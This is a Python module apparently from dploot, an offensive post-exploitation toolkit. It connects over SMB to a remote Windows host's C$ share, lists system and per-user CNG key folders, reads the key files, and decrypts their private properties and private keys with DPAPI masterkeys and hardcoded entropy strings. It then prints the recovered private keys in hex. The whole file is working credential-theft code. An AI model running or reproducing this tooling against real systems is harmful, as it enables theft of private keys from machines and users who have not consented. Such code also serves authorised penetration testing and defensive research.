from binascii import hexlify
import logging
import ntpath
from typing import Callable, List

from dploot.lib.crypto import CNG_BLOB, CNG_PROPERTIES
from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
from dploot.lib.masterkey import Masterkey
from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target
from dploot.triage import Triage


class CngFile:
    def __init__(self, winuser: str, cng_blob: bytes):
        self.winuser = winuser
        self.cng_blob = CNG_BLOB(cng_blob)

        self.decrypted_private_props = None
        self.decrypted_private_key = None

    def decrypt_cng_private_properties(self, masterkeys: List[Masterkey]) -> CNG_PROPERTIES:
        masterkey = find_masterkey_for_blob(
            self.cng_blob["PrivateProperties"].rawData,
            masterkeys=masterkeys
        )
        if masterkey is not None:
            private_properties = decrypt_blob(
                blob_bytes=self.cng_blob["PrivateProperties"].rawData,
                masterkey=masterkey,
                entropy=b"6jnkd5J3ZdQDtrsu\x00"
            )

            self.decrypted_private_props = CNG_PROPERTIES(private_properties)
        
        return self.decrypted_private_props

    def decrypt_cng_private_key(self, masterkeys: List[Masterkey]) -> bytes:
        masterkey = find_masterkey_for_blob(
            self.cng_blob["PrivateKey"].rawData,
            masterkeys=masterkeys
        )
        if masterkey is not None:
            private_key = decrypt_blob(
                blob_bytes=self.cng_blob["PrivateKey"].rawData,
                masterkey=masterkey,
                entropy=b"xT5rZW5qVVbrvpuA\x00"
            )

            self.decrypted_private_key = private_key
        
        return self.decrypted_private_key

    def decrypt_cng_file(self, masterkeys: List[Masterkey]) -> bool:
        return (self.decrypt_cng_private_properties(masterkeys) is not None
                and 
                self.decrypt_cng_private_key(masterkeys) is not None)

    def dump(self):
        self.cng_blob.dump()
        if self.decrypted_private_props is not None:
            print()
            self.decrypted_private_props.dump()
        if self.decrypted_private_key is not None:
            print()
            print("Decrypted Private Key: %s" % hexlify(self.decrypted_private_key))
            print()

    def dump_quiet(self):
        if self.decrypted_private_key is not None:
            print("%s" % hexlify(self.decrypted_private_key))
        

class CngTriage(Triage):
    system_cng_keys_generic_path = [
        "ProgramData\\Microsoft\\Crypto\\Keys",
        "ProgramData\\Microsoft\\Crypto\\SystemKeys",
        "Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Crypto\\Keys",
    ]
    user_cng_keys_generic_path = [
        "Users\\%s\\AppData\\Roaming\\Microsoft\\Crypto\\Keys",
    ]
    share = "C$"

    def __init__(
        self,
        target: Target,
        conn: DPLootSMBConnection,
        masterkeys: List[Masterkey],
        per_cng_callback: Callable = None,
        false_positive: List[str] | None = None,
    ) -> None:
        super().__init__(
            target, 
            conn, 
            masterkeys=masterkeys, 
            per_loot_callback=per_cng_callback, 
            false_positive=false_positive
        )
        self._users = None

    def triage_system_cng(self) -> List[CngFile]:
        cng_files = []
        cng_dirs = self.conn.listDirs(
            self.share, self.system_cng_keys_generic_path
        )
        for system_cng_path, system_cng_dir in cng_dirs.items():
            if system_cng_dir is not None:
                cng_files += self.triage_cng_folder(
                cng_folder_path=system_cng_path,
                cng_folder=system_cng_dir,
                winuser="SYSTEM",
            )
        return cng_files

    def triage_cng(self) -> List[CngFile]:
        cng_files = []
        for user in self.users:
            try:
                cng_files += self.triage_cng_for_user(user)
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                    logging.debug(str(e))
        return cng_files

    def triage_cng_for_user(self, user: str) -> List[CngFile]:
        cng_files = []
        cng_files_path = self.user_cng_keys_generic_path[0] % user
        cng_files_dir = self.conn.remote_list_dir(self.share, cng_files_path)
        if cng_files_dir is not None:
            cng_files += self.triage_cng_folder(
                cng_folder_path=cng_files_path,
                cng_folder=cng_files_dir,
                winuser=user,
            )
        return cng_files

    def triage_cng_folder(
        self, cng_folder_path, cng_folder, winuser: str
    ) -> List[CngFile]:
        cng_files = []
        for cng_file in cng_folder:
            if cng_file.get_longname() not in self.false_positive:
                cng_filepath = ntpath.join(cng_folder_path, cng_file.get_longname())
                logging.debug(
                    f"Found CNG file: \\\\{self.target.address}\\{self.share}\\{cng_filepath}"
                )
                cng_bytes = self.conn.readFile(self.share, cng_filepath, looted_files=self.looted_files)
                cng_file = CngFile(winuser=winuser, cng_blob=cng_bytes)
                if cng_file.decrypt_cng_file(self.masterkeys):
                    cng_files.append(cng_file)
                    if self.per_loot_callback is not None:
                        self.per_loot_callback(cng_file)
        return cng_files
    @property
    def users(self) -> List[str]:
        if self._users is not None:
            return self._users

        self._users = self.conn.list_users(self.share)

        return self._users
                
